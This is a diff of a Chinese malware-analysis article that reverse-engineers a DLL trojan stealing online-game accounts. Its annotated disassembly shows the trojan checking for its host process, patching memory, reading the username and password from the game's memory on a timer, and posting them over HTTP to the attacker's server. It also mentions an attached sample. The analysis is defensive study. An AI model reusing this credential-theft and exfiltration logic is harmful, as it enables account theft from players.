@@ -1,444 +1,991 @@
 
-
 # 内存读取游戏木马分析
 
 > 原文：[`www.pediy.com/kssd/pediy10/94310.html`](https://www.pediy.com/kssd/pediy10/94310.html)
 
-木马 dll 基本信息:  
-文件名:LUDLL.dll  
-大小 20KB.未加壳.  
-导出函数:2 个, HookOn, HookOff.  
-  
-一些地方没有细跟, 粗略的跟了下. 错误之处难免, 欢迎各位指正.  
-  
-  
-DLLEntryPoint:  
-  
-003E4630 >/$  55            push    ebp  
-003E4631  |.  8BEC          mov     ebp, esp  
-003E4633  |.  83C4 BC       add     esp, -44  
-003E4636  |.  33C0          xor     eax, eax  
-003E4638  |.  8945 C0       mov     dword ptr \[ebp-40\], eax  
-003E463B  |.  8945 BC       mov     dword ptr \[ebp-44\], eax                        ;  两个局部变量  
-003E463E  |.  B8 D0453E00   mov     eax, 003E45D0                                  ;  参数进去  
-003E4643  |.  E8 20F1FFFF   call    003E3768             ;  若 fdwReason 为 DLL\_PROCESS\_ATTACH,则会为木马做相关初  
-  
-始化工作.  
-003E4648  |.  33C0          xor     eax, eax  
-003E464A  |.  55            push    ebp  
-003E464B  |.  68 D9463E00   push    003E46D9  
-003E4650  |.  64:FF30       push    dword ptr fs:\[eax\]  
-003E4653  |.  64:8920       mov     dword ptr fs:\[eax\], esp  
-  
-  
-  
-比较自身所在进程的 exe 镜像名, 在 OD 中卫 LoadDLL 和 LUNAClient.exe 进行比较, 并设置标志位.  
-  
-003E4656  |.  68 04010000   push    104                                            ; /BufSize = 104 (260.)  
-003E465B  |.  68 64693E00   push    003E6964                                       ; |PathBuffer = 1.003E6964  
-003E4660  |.  6A 00         push    0                                              ; |hModule = NULL  
-003E4662  |.  E8 11F2FFFF   call    <jmp.&kernel32.GetModuleFileNameA>             ; \\GetModuleFileNameA  
-003E4667  |.  C680 64693E00>mov     byte ptr \[eax+3E6964\], 0  
-003E466E  |.  8D45 BC       lea     eax, dword ptr \[ebp-44\]  
-003E4671  |.  BA 64693E00   mov     edx, 003E6964                                  ;  ASCII "E:\\OllyICE\\LOADDLL.EXE"  
-003E4676  |.  B9 05010000   mov     ecx, 105  
-003E467B  |.  E8 88EAFFFF   call    003E3108  
-003E4680  |.  8B45 BC       mov     eax, dword ptr \[ebp-44\]  
-003E4683  |.  8D55 C0       lea     edx, dword ptr \[ebp-40\]  
-003E4686  |.  E8 5DFEFFFF   call    003E44E8  
-003E468B  |.  8B45 C0       mov     eax, dword ptr \[ebp-40\]  
-003E468E  |.  BA F0463E00   mov     edx, 003E46F0                                  ;  ASCII "LUNAClient.exe"  
-003E4693  |.  E8 90FEFFFF   call    003E4528  
-003E4698  |.  84C0          test    al, al  
-003E469A  |.  74 22         je      short 003E46BE                                 ;  不是指定的宿主进程名则跳出.  
-003E469C  |.  68 00473E00   push    003E4700                                       ; /MutexName = "DFDLL"  
-003E46A1  |.  6A 00         push    0                                              ; |Inheritable = FALSE  
-003E46A3  |.  68 01001F00   push    1F0001                                         ; |Access = 1F0001  
-003E46A8  |.  E8 E3F1FFFF   call    <jmp.&kernel32.OpenMutexA>                     ; \\OpenMutexA  
-003E46AD  |.  85C0          test    eax, eax  
-003E46AF  |.  74 08         je      short 003E46B9  
-003E46B1  |.  50            push    eax                                            ; /hObject  
-003E46B2  |.  E8 69F1FFFF   call    <jmp.&kernel32.CloseHandle>                    ; \\CloseHandle  
-  
-003E4528  /$  53            push    ebx  
-003E4529  |.  56            push    esi  
-003E452A  |.  8BF2          mov     esi, edx  
-003E452C  |.  8BD8          mov     ebx, eax  
-003E452E  |.  6A FF         push    -1  
-003E4530  |.  8BC6          mov     eax, esi  
-003E4532  |.  E8 D1ECFFFF   call    003E3208  
-003E4537  |.  50            push    eax  
-003E4538  |.  6A FF         push    -1  
-003E453A  |.  8BC3          mov     eax, ebx  
-003E453C  |.  E8 C7ECFFFF   call    003E3208  
-003E4541  |.  50            push    eax                                            ; |String1  
-003E4542  |.  6A 01         push    1                                              ; |CmpOptions = NORM\_IGNORECASE  
-003E4544  |.  68 00040000   push    400                                            ; |LocaleId = 400  
-003E4549  |.  E8 DAF2FFFF   call    <jmp.&kernel32.CompareStringA>                 ; \\CompareStringA  
-003E454E  |.  83F8 02       cmp     eax, 2  
-003E4551  |.  0F94C0        sete    al                                             ; 设置标志位.  
-003E4554  |.  5E            pop     esi  
-003E4555  |.  5B            pop     ebx  
-003E4556  \\.  C3            retn  
-  
-堆栈数据:  
-0006F624   00000400  |LocaleId = 400  
-0006F628   00000001  |CmpOptions = NORM\_IGNORECASE  
-0006F62C   00890030  |String1 = "LOADDLL.EXE"  
-0006F630   FFFFFFFF  |Count1 = FFFFFFFF (-1.)  
-0006F634   003E46F0  |String2 = "LUNAClient.exe"  
-0006F638   FFFFFFFF  \\Count2 = FFFFFFFF (-1.)  
-  
-  
-进而打开互斥体 DFDLL, 当然是打开失败, 然后跟进 003e4590  
-  
-003E4590  /$  68 60693E00   push    003E6960                                       ; /pThreadId = 1.003E6960  
-003E4595  |.  6A 00         push    0                                              ; |CreationFlags = 0  
-003E4597  |.  6A 00         push    0                                              ; |pThreadParm = NULL  
-003E4599  |.  68 C8433E00   push    003E43C8                                       ; |ThreadFunction = 1.003E43C8  
-003E459E  |.  6A 00         push    0                                              ; |StackSize = 0  
-003E45A0  |.  6A 00         push    0                                              ; |pSecurity = NULL  
-003E45A2  |.  E8 B1F2FFFF   call    <jmp.&kernel32.CreateThread>                   ; \\CreateThread  
-003E45A7  \\.  C3            retn  
-  
-看得到创建了线程, 断下继续:  
-  
-003E43C8  /.  55            push    ebp                                            ;  TheradFunc  
-003E43C9  |.  8BEC          mov     ebp, esp  
-003E43CB  |.  83C4 E4       add     esp, -1C  
-003E43CE  |.  53            push    ebx  
-003E43CF  |.  56            push    esi  
-003E43D0  |.  8D75 E4       lea     esi, dword ptr \[ebp-1C\]  
-003E43D3  |.  68 28443E00   push    003E4428                                       ;  ASCII "DFDLL"  
-003E43D8  |.  6A 00         push    0  
-003E43DA  |.  6A 00         push    0  
-003E43DC  |.  E8 57F4FFFF   call    003E3838                                       ;  创间互尺体。  
-003E43E1  |.  8BD8          mov     ebx, eax  
-003E43E3  |.  E8 34FFFFFF   call    003E431C  
-003E43E8  |.  EB 0C         jmp     short 003E43F6  
-003E43EA  |>  56            /push    esi                                           ; /pMsg  
-003E43EB  |.  E8 E8F4FFFF   |call    <jmp.&user32.TranslateMessage>                ; \\TranslateMessage  
-003E43F0  |.  56            |push    esi                                           ; /pMsg  
-003E43F1  |.  E8 BAF4FFFF   |call    <jmp.&user32.DispatchMessageA>                ; \\DispatchMessageA  
-003E43F6  |>  6A 00          push    0                                             ; /MsgFilterMax = 0  
-003E43F8  |.  6A 00         |push    0                                             ; |MsgFilterMin = 0  
-003E43FA  |.  6A 00         |push    0                                             ; |hWnd = NULL  
-003E43FC  |.  56            |push    esi                                           ; |pMsg  
-003E43FD  |.  E8 B6F4FFFF   |call    <jmp.&user32.GetMessageA>                     ; \\GetMessageA  
-003E4402  |.  85C0          |test    eax, eax  
-003E4404  |.^ 75 E4         \\jnz     short 003E43EA  
-003E4406  |.  6A 00         push    0                                              ; /ExitCode = 0  
-003E4408  \\.  E8 53F4FFFF   call    <jmp.&kernel32.ExitThread>                     ; \\ExitThread  
-003E440D   .  53            push    ebx                                            ; /hObject  
-003E440E   .  E8 0DF4FFFF   call    <jmp.&kernel32.CloseHandle>                    ; \\CloseHandle  
-003E4413   .  6A 00         push    0                                              ; /ExitCode = 0  
-003E4415   .  A1 50663E00   mov     eax, dword ptr \[3E6650\]                        ; |  
-003E441A   .  50            push    eax                                            ; |hLibModule => 003E0000  
-003E441B   .  E8 48F4FFFF   call    <jmp.&kernel32.FreeLibraryAndExitThread>       ; \\FreeLibraryAndExitThread  
-003E4420   .  5E            pop     esi  
-003E4421   .  5B            pop     ebx  
-003E4422   .  8BE5          mov     esp, ebp  
-003E4424   .  5D            pop     ebp  
-003E4425   .  C2 0400       retn    4  
-  
-  
-其中 3e3838 call: 创建互斥体, 保持同时只有一个木马被加载:  
-003E3838  /$  55            push    ebp  
-003E3839  |.  8BEC          mov     ebp, esp  
-003E383B  |.  8B45 10       mov     eax, dword ptr \[ebp+10\]  
-003E383E  |.  50            push    eax                                            ; /MutexName = "DFDLL"  
-003E383F  |.  837D 0C 01    cmp     dword ptr \[ebp+C\], 1                           ; |  
-003E3843  |.  1BC0          sbb     eax, eax                                       ; |  
-003E3845  |.  40            inc     eax                                            ; |  
-003E3846  |.  83E0 7F       and     eax, 7F                                        ; |  
-003E3849  |.  50            push    eax                                            ; |InitialOwner  
-003E384A  |.  8B45 08       mov     eax, dword ptr \[ebp+8\]                         ; |  
-003E384D  |.  50            push    eax                                            ; |pSecurity  
-003E384E  |.  E8 DDFFFFFF   call    <jmp.&kernel32.CreateMutexA>                   ; \\CreateMutexA  
-003E3853  |.  5D            pop     ebp  
-003E3854  \\.  C2 0C00       retn    0C  
-  
-  
-其中 003E431C call:  在注册一个 Timer 之前还有一个 call 3e3d0c (对当前进程写入次数据,第一次一个字节,第二次一个 DWORD,重复三次).  
-003E431C  /$  B8 8C683E00   mov     eax, 003E688C  
-003E4321  |.  33C9          xor     ecx, ecx  
-003E4323  |.  BA 40000000   mov     edx, 40  
-003E4328  |.  E8 A7E2FFFF   call    003E25D4  
-003E432D  |.  B8 CC683E00   mov     eax, 003E68CC  
-003E4332  |.  33C9          xor     ecx, ecx  
-003E4334  |.  BA 40000000   mov     edx, 40  
-003E4339  |.  E8 96E2FFFF   call    003E25D4  
-003E433E  |.  B8 0C693E00   mov     eax, 003E690C  
-003E4343  |.  33C9          xor     ecx, ecx  
-003E4345  |.  BA 40000000   mov     edx, 40  
-003E434A  |.  E8 85E2FFFF   call    003E25D4  
-003E434F  |.  E8 B8F9FFFF   call    003E3D0C  
-003E4354  |.  68 D03E3E00   push    003E3ED0                                       ; /Timerproc = 1.003E3ED0  
-003E4359  |.  68 10270000   push    2710                                           ; |Timeout = 10000. ms  
-003E435E  |.  6A 00         push    0                                              ; |TimerID = 0  
-003E4360  |.  6A 00         push    0                                              ; |hWnd = NULL  
-003E4362  |.  E8 61F5FFFF   call    <jmp.&user32.SetTimer>                         ; \\SetTimer  
-003E4367  |.  A3 4C693E00   mov     dword ptr \[3E694C\], eax  
-003E436C  \\.  C3            retn  
-  
-3e3d0c 写进程内存:  
-  
-003E3D0C  /$  53            push    ebx  
-003E3D0D  |.  56            push    esi  
-003E3D0E  |.  57            push    edi  
-003E3D0F  |.  55            push    ebp  
-003E3D10  |.  83C4 F4       add     esp, -0C  
-003E3D13  |.  C64424 04 E9  mov     byte ptr \[esp+4\], 0E9  
-003E3D18  |.  B8 A8423E00   mov     eax, 003E42A8  
-003E3D1D  |.  2D E0CE4000   sub     eax, 40CEE0  
-003E3D22  |.  83E8 05       sub     eax, 5  
-003E3D25  |.  A3 74663E00   mov     dword ptr \[3E6674\], eax  
-003E3D2A  |.  B8 CC423E00   mov     eax, 003E42CC  
-003E3D2F  |.  2D F1CE4000   sub     eax, 40CEF1  
-003E3D34  |.  83E8 05       sub     eax, 5  
-003E3D37  |.  A3 78663E00   mov     dword ptr \[3E6678\], eax  
-003E3D3C  |.  B8 F0423E00   mov     eax, 003E42F0  
-003E3D41  |.  2D 05924000   sub     eax, 409205  
-003E3D46  |.  83E8 05       sub     eax, 5  
-003E3D49  |.  A3 7C663E00   mov     dword ptr \[3E667C\], eax  
-003E3D4E  |.  E8 1DFBFFFF   call    <jmp.&kernel32.GetCurrentProcessId>            ; \[GetCurrentProcessId  
-003E3D53  |.  50            push    eax                                            ; /ProcessId  
-003E3D54  |.  6A FF         push    -1                                             ; |Inheritable = TRUE  
-003E3D56  |.  68 FF0F1F00   push    1F0FFF                                         ; |Access = PROCESS\_ALL\_ACCESS  
-003E3D5B  |.  E8 38FBFFFF   call    <jmp.&kernel32.OpenProcess>                    ; \\OpenProcess  
-003E3D60  |.  8BE8          mov     ebp, eax  
-003E3D62  |.  85ED          test    ebp, ebp  
-003E3D64  |.  74 4A         je      short 003E3DB0  
-003E3D66  |.  C70424 030000>mov     dword ptr \[esp\], 3  
-003E3D6D  |.  BB B0503E00   mov     ebx, 003E50B0                                  ;  ASCII "辔@"  
-003E3D72  |.  BE BC503E00   mov     esi, 003E50BC                                  ;  ASCII "嵛@"  
-003E3D77  |.  BF 74663E00   mov     edi, 003E6674  
-003E3D7C  |>  8D4424 08     /lea     eax, dword ptr \[esp+8\]  
-003E3D80  |.  50            |push    eax                                           ; /pBytesWritten  
-003E3D81  |.  6A 01         |push    1                                             ; |BytesToWrite = 1  
-003E3D83  |.  8D4424 0C     |lea     eax, dword ptr \[esp+C\]                        ; |  
-003E3D87  |.  50            |push    eax                                           ; |Buffer  
-003E3D88  |.  8B03          |mov     eax, dword ptr \[ebx\]                          ; |  
-003E3D8A  |.  50            |push    eax                                           ; |Address  
-003E3D8B  |.  55            |push    ebp                                           ; |hProcess  
-003E3D8C  |.  E8 0FFBFFFF   |call    <jmp.&kernel32.WriteProcessMemory>            ; \\WriteProcessMemory  
-003E3D91  |.  8D4424 08     |lea     eax, dword ptr \[esp+8\]  
-003E3D95  |.  50            |push    eax                                           ; /pBytesWritten  
-003E3D96  |.  6A 04         |push    4                                             ; |BytesToWrite = 4  
-003E3D98  |.  57            |push    edi                                           ; |Buffer  
-003E3D99  |.  8B06          |mov     eax, dword ptr \[esi\]                          ; |  
-003E3D9B  |.  50            |push    eax                                           ; |Address  
-003E3D9C  |.  55            |push    ebp                                           ; |hProcess  
-003E3D9D  |.  E8 FEFAFFFF   |call    <jmp.&kernel32.WriteProcessMemory>            ; \\WriteProcessMemory  
-003E3DA2  |.  83C7 04       |add     edi, 4  
-003E3DA5  |.  83C6 04       |add     esi, 4  
-003E3DA8  |.  83C3 04       |add     ebx, 4  
-003E3DAB  |.  FF0C24        |dec     dword ptr \[esp\]  
-003E3DAE  |.^ 75 CC         \\jnz     short 003E3D7C  
-003E3DB0  |>  83C4 0C       add     esp, 0C  
-003E3DB3  |.  5D            pop     ebp  
-003E3DB4  |.  5F            pop     edi  
-003E3DB5  |.  5E            pop     esi  
-003E3DB6  |.  5B            pop     ebx  
-003E3DB7  \\.  C3            retn  
-  
-  
-在来看 timer:   
-  
-这个 Timer 就是专门负责盗取账号密码的.  Timer 的间隔时间设置诶 10s, 只有当用户登录了之后密码才会在内存里面.  
-  
-003E3ED0  /.  55            push    ebp  
-003E3ED1  |.  8BEC          mov     ebp, esp  
-003E3ED3  |.  B9 04000000   mov     ecx, 4  
-003E3ED8  |>  6A 00         /push    0  
-003E3EDA  |.  6A 00         |push    0  
-003E3EDC  |.  49            |dec     ecx  
-003E3EDD  |.^ 75 F9         \\jnz     short 003E3ED8                                ;  压点空间出来。  
-003E3EDF  |.  51            push    ecx  
-003E3EE0  |.  33C0          xor     eax, eax  
-003E3EE2  |.  55            push    ebp  
-003E3EE3  |.  68 18403E00   push    003E4018  
-003E3EE8  |.  64:FF30       push    dword ptr fs:\[eax\]  
-003E3EEB  |.  64:8920       mov     dword ptr fs:\[eax\], esp  
-003E3EEE  |.  833D D4503E00>cmp     dword ptr \[3E50D4\], 0A  
-003E3EF5  |.  0F8C FC000000 jl      003E3FF7  
-003E3EFB  |.  8D45 FC       lea     eax, dword ptr \[ebp-4\]                         ;  作为输出参数。  
-003E3EFE  |.  BA 20ED8500   mov     edx, 85ED20                                    ;  作参数。游戏进程的某内存地址。  
-003E3F03  |.  E8 D0F1FFFF   call    <Read\_Dword>                                   ;  读某值。这个东西读出来是为了判断游戏版本。  
-003E3F08  |.  837D FC 00    cmp     dword ptr \[ebp-4\], 0  
-003E3F0C  |.  0F84 E5000000 je      003E3FF7                                       ;  这里我们的是 OD, 不是游戏， 所以肯定会挑走， 我们不  
-  
-让他挑走。  
-003E3F12  |.  E8 A1FEFFFF   call    003E3DB8                                       ;  读 ini 配置文件相关信息。  
-003E3F17  |.  68 2C403E00   push    003E402C                                       ;  ASCII "User="  
-003E3F1C  |.  8D45 F4       lea     eax, dword ptr \[ebp-C\]  
-003E3F1F  |.  BA 8C683E00   mov     edx, 003E688C  
-003E3F24  |.  E8 AFF1FFFF   call    <Read\_Dword>                                   ;  读用户名内容。  
-003E3F29  |.  FF75 F4       push    dword ptr \[ebp-C\]  
-003E3F2C  |.  68 3C403E00   push    003E403C  
-003E3F31  |.  68 48403E00   push    003E4048                                       ;  ASCII "Pass="  
-003E3F36  |.  8D45 F0       lea     eax, dword ptr \[ebp-10\]  
-003E3F39  |.  BA CC683E00   mov     edx, 003E68CC  
-003E3F3E  |.  E8 95F1FFFF   call    <Read\_Dword>                                   ;  读密码内容。  
-003E3F43  |.  FF75 F0       push    dword ptr \[ebp-10\]  
-003E3F46  |.  68 3C403E00   push    003E403C  
-003E3F4B  |.  68 58403E00   push    003E4058                                       ;  ASCII "Leve="  
-003E3F50  |.  A1 CC503E00   mov     eax, dword ptr \[3E50CC\]  
-003E3F55  |.  E8 AEF2FFFF   call    <CheckPointer>  
-003E3F5A  |.  8BD0          mov     edx, eax  
-003E3F5C  |.  8D45 EC       lea     eax, dword ptr \[ebp-14\]  
-003E3F5F  |.  E8 74F1FFFF   call    <Read\_Dword>                                   ;  读等级。  
-003E3F64  |.  FF75 EC       push    dword ptr \[ebp-14\]  
-003E3F67  |.  68 3C403E00   push    003E403C  
-003E3F6C  |.  68 68403E00   push    003E4068                                       ;  ASCII "Serv="  
-003E3F71  |.  A1 D0503E00   mov     eax, dword ptr \[3E50D0\]  
-003E3F76  |.  E8 8DF2FFFF   call    <CheckPointer>  
-003E3F7B  |.  8BD0          mov     edx, eax  
-003E3F7D  |.  8D45 E8       lea     eax, dword ptr \[ebp-18\]  
-003E3F80  |.  E8 53F1FFFF   call    <Read\_Dword>                                   ;  读服务器。  
-003E3F85  |.  FF75 E8       push    dword ptr \[ebp-18\]  
-003E3F88  |.  68 3C403E00   push    003E403C  
-003E3F8D  |.  68 78403E00   push    003E4078                                       ;  ASCII "Cank="  
-003E3F92  |.  8B45 FC       mov     eax, dword ptr \[ebp-4\]  
-003E3F95  |.  E8 6EF2FFFF   call    <CheckPointer>  
-003E3F9A  |.  8BD0          mov     edx, eax  
-003E3F9C  |.  8D45 E4       lea     eax, dword ptr \[ebp-1C\]  
-003E3F9F  |.  E8 34F1FFFF   call    <Read\_Dword>                                   ;  读 CANK  
-003E3FA4  |.  FF75 E4       push    dword ptr \[ebp-1C\]  
-003E3FA7  |.  8D45 F8       lea     eax, dword ptr \[ebp-8\]  
-003E3FAA  |.  BA 0E000000   mov     edx, 0E  
-003E3FAF  |.  E8 B8F1FFFF   call    003E316C  
-003E3FB4  |.  8B45 F8       mov     eax, dword ptr \[ebp-8\]  
-003E3FB7  |.  50            push    eax  
-003E3FB8  |.  8D45 E0       lea     eax, dword ptr \[ebp-20\]  
-003E3FBB  |.  BA 80673E00   mov     edx, 003E6780  
-003E3FC0  |.  B9 00010000   mov     ecx, 100  
-003E3FC5  |.  E8 3EF1FFFF   call    003E3108  
-003E3FCA  |.  8B45 E0       mov     eax, dword ptr \[ebp-20\]  
-003E3FCD  |.  50            push    eax  
-003E3FCE  |.  8D45 DC       lea     eax, dword ptr \[ebp-24\]  
-003E3FD1  |.  BA 80663E00   mov     edx, 003E6680  
-003E3FD6  |.  B9 00010000   mov     ecx, 100  
-003E3FDB  |.  E8 28F1FFFF   call    003E3108  
-003E3FE0  |.  8B45 DC       mov     eax, dword ptr \[ebp-24\]  
-003E3FE3  |.  5A            pop     edx  
-003E3FE4  |.  59            pop     ecx  
-003E3FE5      E8 12FAFFFF   call    003E39FC                                       ;  发送密码等信息。  
-003E3FEA  |.  A1 4C693E00   mov     eax, dword ptr \[3E694C\]  
-003E3FEF  |.  50            push    eax                                            ; /TimerID => 7DD3 (32211.)  
-003E3FF0  |.  6A 00         push    0                                              ; |hWnd = NULL  
-003E3FF2  |.  E8 C9F8FFFF   call    <jmp.&user32.KillTimer>                        ; \\KillTimer  
-003E3FF7  |>  FF05 D4503E00 inc     dword ptr \[3E50D4\]  
-003E3FFD  |.  33C0          xor     eax, eax  
-003E3FFF  |.  5A            pop     edx  
-003E4000  |.  59            pop     ecx  
-003E4001  |.  59            pop     ecx  
-003E4002  |.  64:8910       mov     dword ptr fs:\[eax\], edx  
-003E4005  |.  68 1F403E00   push    003E401F  
-003E400A  |>  8D45 DC       lea     eax, dword ptr \[ebp-24\]  
-003E400D  |.  BA 09000000   mov     edx, 9  
-003E4012  |.  E8 F1EFFFFF   call    003E3008  
-003E4017  \\.  C3            retn  
-  
-  
-  
-在用 OD 调试的时候, 由于该 dll 木马中设定的游戏内存地址在 Loaddll 中并不存在, 所以单步跟会异常的, 我直接新建 EIp 的.  
-  
-  
-  
-003E39FC 这个 call 就是用于最后发送密码等信息. 发送完就 killTimer 收工.   
-  
-还是去看一下这个发送函数, 它使用的是 POST 方式发送到指定地址的.  
-  
-... ...  
-003E3A46   .  6A 00         push    0  
-003E3A48   .  6A 00         push    0  
-003E3A4A   .  6A 00         push    0  
-003E3A4C   .  6A 00         push    0  
-003E3A4E   .  68 203C3E00   push    003E3C20                                       ;  ASCII "MyApp"  
-003E3A53   .  E8 F0FEFFFF   call    <jmp.&wininet.InternetOpenA>  
-003E3A58   .  8945 F0       mov     dword ptr \[ebp-10\], eax  
-003E3A5B   .  33D2          xor     edx, edx  
-003E3A5D   .  55            push    ebp  
-003E3A5E   .  68 D73B3E00   push    003E3BD7  
-003E3A63   .  64:FF32       push    dword ptr fs:\[edx\]  
-003E3A66   .  64:8922       mov     dword ptr fs:\[edx\], esp  
-003E3A69   .  837D F0 00    cmp     dword ptr \[ebp-10\], 0  
-003E3A6D   .  0F84 4D010000 je      003E3BC0  
-003E3A73   .  8D45 D8       lea     eax, dword ptr \[ebp-28\]  
-003E3A76   .  50            push    eax  
-003E3A77   .  8D4D DC       lea     ecx, dword ptr \[ebp-24\]  
-003E3A7A   .  8B55 F8       mov     edx, dword ptr \[ebp-8\]  
-003E3A7D   .  8B45 FC       mov     eax, dword ptr \[ebp-4\]  
-003E3A80   .  E8 0BFFFFFF   call    003E3990  
-003E3A85   .  6A 00         push    0  
-003E3A87   .  6A 00         push    0  
-003E3A89   .  6A 03         push    3  
-003E3A8B   .  6A 00         push    0  
-003E3A8D   .  6A 00         push    0  
-003E3A8F   .  6A 50         push    50  
-003E3A91   .  8B45 DC       mov     eax, dword ptr \[ebp-24\]  
-003E3A94   .  E8 6FF7FFFF   call    <CheckPointer>  
-003E3A99   .  50            push    eax  
-003E3A9A   .  8B45 F0       mov     eax, dword ptr \[ebp-10\]  
-003E3A9D   .  50            push    eax  
-003E3A9E   .  E8 9DFEFFFF   call    <jmp.&wininet.InternetConnectA>  
-003E3AA3   .  8945 EC       mov     dword ptr \[ebp-14\], eax  
-003E3AA6   .  B8 283C3E00   mov     eax, 003E3C28                                  ;  ASCII "Accept: \*/\*"  
-003E3AAB   .  8945 D4       mov     dword ptr \[ebp-2C\], eax  
-003E3AAE   .  6A 00         push    0  
-003E3AB0   .  68 00000080   push    80000000  
-003E3AB5   .  8D45 D4       lea     eax, dword ptr \[ebp-2C\]  
-003E3AB8   .  50            push    eax  
-003E3AB9   .  6A 00         push    0  
-003E3ABB   .  68 343C3E00   push    003E3C34                                       ;  ASCII "HTTP/1.0"  
-003E3AC0   .  8B45 D8       mov     eax, dword ptr \[ebp-28\]  
-003E3AC3   .  E8 40F7FFFF   call    <CheckPointer>  
-003E3AC8   .  50            push    eax  
-003E3AC9   .  68 403C3E00   push    003E3C40                                       ;  ASCII "POST"  
-003E3ACE   .  8B45 EC       mov     eax, dword ptr \[ebp-14\]  
-003E3AD1   .  50            push    eax  
-003E3AD2   .  E8 49FEFFFF   call    <jmp.&wininet.HttpOpenRequestA>  
-003E3AD7   .  8945 E8       mov     dword ptr \[ebp-18\], eax  
-003E3ADA   .  8B45 F4       mov     eax, dword ptr \[ebp-C\]  
-003E3ADD   .  E8 3EF6FFFF   call    003E3120  
-003E3AE2   .  50            push    eax  
-003E3AE3   .  8B45 F4       mov     eax, dword ptr \[ebp-C\]  
-003E3AE6   .  E8 1DF7FFFF   call    <CheckPointer>  
-003E3AEB   .  50            push    eax  
-003E3AEC   .  6A 2F         push    2F  
-003E3AEE   .  68 483C3E00   push    003E3C48                                       ;  ASCII "Content-Type: application/x-www-form-  
-  
-urlencoded"  
-003E3AF3   .  8B45 E8       mov     eax, dword ptr \[ebp-18\]  
-003E3AF6   .  50            push    eax  
-003E3AF7   .  E8 34FEFFFF   call    <jmp.&wininet.HttpSendRequestA>  
-003E3AFC   .  33C0          xor     eax, eax  
-003E3AFE   .  8945 CC       mov     dword ptr \[ebp-34\], eax  
-003E3B01   .  C745 D0 00040>mov     dword ptr \[ebp-30\], 400  
-003E3B08   .  8B45 D0       mov     eax, dword ptr \[ebp-30\]  
-003E3B0B   .  E8 28E9FFFF   call    003E2438  
-003E3B10   .  8BD8          mov     ebx, eax  
-003E3B12   .  8D45 CC       lea     eax, dword ptr \[ebp-34\]  
-003E3B15   .  50            push    eax  
-003E3B16   .  8D45 D0       lea     eax, dword ptr \[ebp-30\]  
-003E3B19   .  50            push    eax  
-003E3B1A   .  53            push    ebx  
-003E3B1B   .  6A 05         push    5  
-003E3B1D   .  8B45 E8       mov     eax, dword ptr \[ebp-18\]  
-003E3B20   .  50            push    eax  
-003E3B21   .  E8 02FEFFFF   call    <jmp.&wininet.HttpQueryInfoA>  
-  
-  
-很显然, 木马调用 HttpSendRequestA 向木马作者服务器提交 POST 请求以提交帐号密码等数据.   
-  
-另外, 此 dll 虽导出了 HookOn 和 HookOff 函数, 不过里面却是空的,没做啥事, 应为该木马主要是通过 SetWindowsHookEx 的方式来将 dll 注入至游戏进程的. 并  
-  
-没 Hook 啥东西.  
-  
-  
-附件为样本, 密码:pediy
+## 木马 dll 基本信息
 
-上传的附件
-| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || LuDll.rar  
- |
+- **文件名**: `LUDLL.dll`
+- **大小**: 20KB. 未加壳.
+- **导出函数**: 2 个, `HookOn`, `HookOff`.
+- **备注**: 一些地方没有细跟, 粗略的跟了下. 错误之处难免, 欢迎各位指正.
+
+## DLLEntryPoint
+
+```
+003E4630  >/$  55             push    ebp
+003E4631  |.  8BEC           mov     ebp, esp
+003E4633  |.  83C4 BC       add     esp, -44
+003E4636  |.  33C0           xor     eax, eax
+003E4638  |.  8945 C0       mov     dword ptr [ebp-40], eax
+003E463B  |.  8945 BC       mov     dword ptr [ebp-44], eax                          ; 两个局部变量
+003E463E  |.  B8 D0453E00   mov     eax, 003E45D0                                 ; 参数进去
+003E4643  |.  E8 20F1FFFF    call    003E3768                    ; 若 fdwReason 为 DLL_PROCESS_ATTACH,则会为木马做相关初始化工作.
+003E4648  |.  33C0           xor     eax, eax
+003E464A  |.  55             push    ebp
+003E464B  |.  68 D9463E00   push    003E46D9
+003E4650  |.  64:FF30       push    dword ptr fs:[eax]
+003E4653  |.  64:8920       mov     dword ptr fs:[eax], esp
+
+比较自身所在进程的 exe 镜像名, 在 OD 中卫 LoadDLL 和 LUNAClient.exe 进行比较, 并设置标志位.
+
+003E4656  |.  68 04010000   push    104                                     ; /BufSize = 104 (260.)
+003E465B  |.  68 64693E00   push    003E6964                                  ; |PathBuffer = 1.003E6964
+003E4660  |.  6A 00          push    0                                        ; |hModule = NULL
+003E4662  |.  E8 11F2FFFF   call    <jmp.&kernel32.GetModuleFileNameA>      ; \GetModuleFileNameA
+003E4667  |.  C680 64693E00>mov      byte ptr [eax+3E6964], 0
+003E466E  |.  8D45 BC       lea     eax, dword ptr [ebp-44]
+003E4671  |.  BA 64693E00   mov     edx, 003E6964                              ;  ASCII "E:\OllyICE\LOADDLL.EXE"
+003E4676  |.  B9 05010000   mov     ecx, 105
+003E467B  |.  E8 88EAFFFF   call    003E3108
+003E4680  |.  8B45 BC       mov     eax, dword ptr [ebp-44]
+003E4683  |.  8D55 C0       lea     edx, dword ptr [ebp-40]
+003E4686  |.  E8 5DFEFFFF   call    003E44E8
+003E468B  |.  8B45 C0       mov     eax, dword ptr [ebp-40]
+003E468E  |.  BA F0463E00   mov     edx, 003E46F0                              ;  ASCII "LUNAClient.exe"
+003E4693  |.  E8 90FEFFFF   call    003E4528
+003E4698  |.  84C0           test    al, al
+003E469A  |.  74 22          je      short 003E46BE                           ;  不是指定的宿主进程名则跳出.
+003E469C  |.  68 00473E00   push    003E4700                                  ; /MutexName = "DFDLL"
+003E46A1  |.  6A 00          push    0                                         ; |Inheritable = FALSE
+003E46A3  |.  68 01001F00   push    1F0001                                    ; |Access = 1F0001
+003E46A8  |.  E8 E3F1FFFF   call    <jmp.&kernel32.OpenMutexA>              ; \OpenMutexA
+003E46AD  |.  85C0           test    eax, eax
+003E46AF  |.  74 08          je      short 003E46B9
+003E46B1  |.  50             push    eax                                      ; /hObject
+003E46B2  |.  E8 69F1FFFF   call    <jmp.&kernel32.CloseHandle>             ; \CloseHandle
+
+003E4528  /$  53             push    ebx
+003E4529  |.  56             push    esi
+003E452A  |.  8BF2           mov     esi, edx
+003E452C  |.  8BD8           mov     ebx, eax
+003E452E  |.  6A FF          push    -1
+003E4530  |.  8BC6           mov     eax, esi
+003E4532  |.  E8 D1ECFFFF   call    003E3208
+003E4537  |.  50             push    eax
+003E4538  |.  6A FF          push    -1
+003E453A  |.  8BC3           mov     eax, ebx
+003E453C  |.  E8 C7ECFFFF   call    003E3208
+003E4541  |.  50             push    eax                                      ; |String1
+003E4542  |.  6A 01          push    1                                         ; |CmpOptions = NORM_IGNORECASE
+003E4544  |.  68 00040000   push    400                                       ; |LocaleId = 400
